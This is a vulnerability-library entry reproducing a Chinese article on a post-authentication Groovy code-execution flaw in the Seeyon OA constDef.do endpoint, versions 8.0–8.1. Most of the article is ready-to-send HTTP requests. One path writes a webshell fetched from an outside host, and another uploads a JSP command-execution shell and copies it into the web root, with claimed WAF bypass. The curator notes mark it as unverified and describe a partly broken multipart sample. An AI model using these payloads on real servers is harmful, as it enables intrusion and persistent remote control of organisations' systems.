---
source: "MrWQ/vulnerability-paper"
title: "致远Seeyon constDef.do存储Groovy求值代码执行"
product: "致远Seeyon"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "8.0–8.1；varchar255限制；2023-08-11补丁声称"
prerequisites: "后台有效会话，最低角色未明"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/DUr29QycSLj06rYAZLKeNA"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/Nday%20%E8%87%B4%E8%BF%9C%20constDef.do%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%B7%B1%E5%BA%A6%E5%88%A9%E7%94%A8.md"
id: "vw-65b8cd62b5184f5ba7cce9f1"
entity_id: "ve-65b8cd62b5184f5ba7cce9f1"
schema_version: "1"
---

# 致远Seeyon constDef.do存储Groovy求值代码执行

## 条目说明

- 对象与具体问题：致远Seeyon；constDef.do存储Groovy求值代码执行
- 版本、配置及部署条件：8.0–8.1；varchar255限制；2023-08-11补丁声称
- 认证与权限前提：后台有效会话，最低角色未明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 属于致远正确分类；三步常量创建/引用/list触发逻辑较清楚
- 不出网上传multipart所有name/filename丢失；样例日期07/22与后续路径06/06不符，需动态替换
- 完美解决任何情况/Bypass WAF是过度主张，应限定所示条件
- 后台写常量/文件有持久副作用；关键源码全图片，缺官方补丁公告

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DUr29QycSLj06rYAZLKeNA)

<table data-mpa-powered-by="yiban.io" width="677"><tbody><tr><td width="557" valign="top" height="62"><h3 cid="n0" mdtype="heading" data-style="margin-top: 1rem; margin-bottom: 1rem; outline: 0px; font-weight: bold; font-size: 1.5em; background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); white-space: pre-wrap; break-after: avoid-page; break-inside: avoid; orphans: 4; line-height: 1.43; cursor: text; caret-color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;Segoe UI Emoji&quot;, sans-serif; letter-spacing: normal; text-align: start; visibility: visible;" id="sr-toc-0">免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责。<br></h3></td></tr></tbody></table>

大家可以把安全绘景设为星标，这样就可以及时看到我们最新发布内容啦！

![](../../.resource/remote/fdd5cc36af6a26060283f6daa9c0c1d1a3873f93a2dbc8a353819f06b9272123.png)

#### 前言

最早致远官方是在 **2023-8-11** 号对 **constDef.do** 接口出了官方漏洞修复补丁。但目前该**漏洞点**是位于**后台**，所以目前还是有部分依然可以打。本文仅以安全研究为目的，请勿用做非法用途。

![](../../.resource/remote/ba61fbab483a58edafbc1968d3d1fc76f7e6d82a7dd535f4641ea435a3bc23d7.png)

影响范围  

*   **version:   Seeyon V8.0-8.1**
    

#### 漏洞分析

这里就简单说一下漏洞，不做详细分析。

漏洞点：`com.seeyon.ctp.view.modules.operationcenter.constdef.controller.ConstDefController`

在`newConstDef`方法接受三个参数`constKey、constDefine`和`constDescription`判断是否为空，如果不为空传入到`insertConstDef()`方法，而这里就是导致为什么 **payload** 长度不能太长，就是因为这里插入到数据库，而数据 **varchar** 长度默认为 **255**。

![](../../.resource/remote/01145c4646b820b1e0f492d3be404dcc1913dbfc645c67de8e3c71e1303a2611.png)

![](../../.resource/remote/3781ee66b1e2a081a4d1ebafbcf03363a9a85dde84c979d87e8861b83f9f36d4.png)  
  

漏洞触发点：**listConstDef**

首先判断`_search`是否为空，如果为空进入到 else 语句，将`page`和`rows`两参数传入到`listPage`方法中。

![](../../.resource/remote/94228c362b19721ccd7cba6831b609a8080653f2a17736403163481b4e8de879.png)

![](../../.resource/remote/5bf05fd57523e762ae7ea3420b1a787a2237492e5da4f145a72ed485c419b6dd.png)  
![](../../.resource/remote/e30103ea659454d78f013df600f2aba417ff86ec2b12644c9c0faf4dbfb2a56f.png)  
![](../../.resource/remote/026f8653a6271c5b4600c77046abec1c2a155aed38edfa52f8913dda55960187.png)  
![](../../.resource/remote/4c2b38b7b18413d863e296c7ae8e543663f4e7f8342241578867cb296ec45fdc.png)  
![](../../.resource/remote/b439e4fb89b565ddbd58fb68faeacd6e776d0c48470d3f0598ac704a10985be6.png)  
最后将之前插入到数据库内容进行判断是否以 **$** 开头，然后判断`ConstType`参数是否为 **3**, 如果是则调用`ScriptEvaluator.eval`方法执行 **groovy** 代码。  

![](../../.resource/remote/d4487868b94e76e72d3845697c454f277c41b5f2b623cc4150595dadb8d7af67.png)

![](../../.resource/remote/5d8a695389ccf4ecade1d81e9f304baf64fd07bdff6148d5e83ad3e77bf58f8e.png)  
漏洞复现（Trick）  

**目前给的 Payload 能够比较完美解决了该漏洞实战所遇到的任何情况。**

*   **支持写入任意长度的 Webshell**
    
*   **支持出网 / 不出网利用**
    
*   **具有 Bypass Waf 效果**
    

##### 出网情况

_**> Step1：**_

出网情况直接通过远程下载可以比较有效 **Bypass Waf** 方法。

```http
POST /seeyon/constDef.do HTTP/1.1
Host: 172.16.135.220:8089
accept: */*
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 545

method=newConstDef&constKey=uddd1&constDefine=new+File('../webapps/ROOT/test.jspx')+<<+new+URL('http%3a//192.168.43.81%3a18080/123.txt').text&constType=2


```

> 请求长度说明：原资料 Content-Length 为 545；保留原始标头；其数值未据实际请求体重新计算或验证。

![](../../.resource/remote/0e7266d7d601024d8d311b4917a29732167696dfb80e22528e78f88b0a6924ef.png)

_**> Step2：**_

引用**`Step1:`**定义常量，构造闭合造成代码执行。

```http
POST /seeyon/constDef.do HTTP/1.1
Host: 172.16.135.220:8089
accept: */*
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

method=newConstDef&constKey=runtime1c2345accaccc&constDefine=evaluate+$uddd1&constType=3


```

> 请求长度说明：原资料 Content-Length 为 89；保留原始标头；其数值未据实际请求体重新计算或验证。

![](../../.resource/remote/07bc73fa5877ff88c3e92662fa3c793ab48a6e8b58b5400fc125b50a1dbe502a.png)

_**> Step3：**_

通过**`listConstDef`**方法触发漏洞

```http
POST /seeyon/constDef.do HTTP/1.1
Host: 172.16.135.220:8089
accept: */*
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

method=listConstDef&page=1&rows=100


```

> 请求长度说明：原资料 Content-Length 为 35；保留原始标头；其数值未据实际请求体重新计算或验证。

![](../../.resource/remote/a20a42d7022ba1726ed22cd41e6226bd64e792839800bfd30611d6dfe956a302.png)

##### 不出网情况

_**> Step1：**_

把文件进行落地。

上传后的路径：/base/upload / 年 / 月 / 日 / 返回的 id

例如：/base/upload/2024/07/22/2101525989813472287

```http
POST /seeyon/fileUpload.do?method=processUpload&maxSize= HTTP/1.1
Host: 172.16.135.236:8089
Cookie: JSESSIONID=0D3102C6F8445B2207B3A29DF9C4BAE6
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------1416682316313
Content-Length: 1172

-----------------------------1416682316313
Content-Disposition: form-data; 


-----------------------------1416682316313
Content-Disposition: form-data; 


-----------------------------1416682316313
Content-Disposition: form-data; 


-----------------------------1416682316313
Content-Disposition: form-data; 


-----------------------------1416682316313
Content-Disposition: form-data; 


-----------------------------1416682316313
Content-Disposition: form-data; 


-----------------------------1416682316313
Content-Disposition: form-data; 

false
-----------------------------1416682316313
Content-Disposition: form-data; 
Content-Type: Image/x-zip-compressed

<% Runtime.getRuntime().exec(request.getParameter("a"));%>
-----------------------------1416682316313--


```

> 请求长度说明：原资料 Content-Length 为 1172；保留原始标头；其数值未据实际请求体重新计算或验证。

![](../../.resource/remote/a4f761b8559b41a0f6629b3bafaded980ad695741c10f23d02abd4d7801bfd78.png)

_**> Step2：**_

通过读取本地文件，进行写入文件可以完美解决写入文件长度的长度。

```http
POST /seeyon/constDef.do HTTP/1.1
Host: 172.16.135.220:8089
accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 545
method=newConstDef&constKey=u6da&constDefine=new+File('../webapps/ROOT/gsl.jsp')+<<+new+File('../../base/upload/2024/06/06/2101525989813472287').text&constType=2

```

后续两个步骤触发漏洞跟之前的 **Step2**、**Step3** 一样。

* * *

**除了上面的方法还有更好利用 trick 方法，欢迎大家挖掘。**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
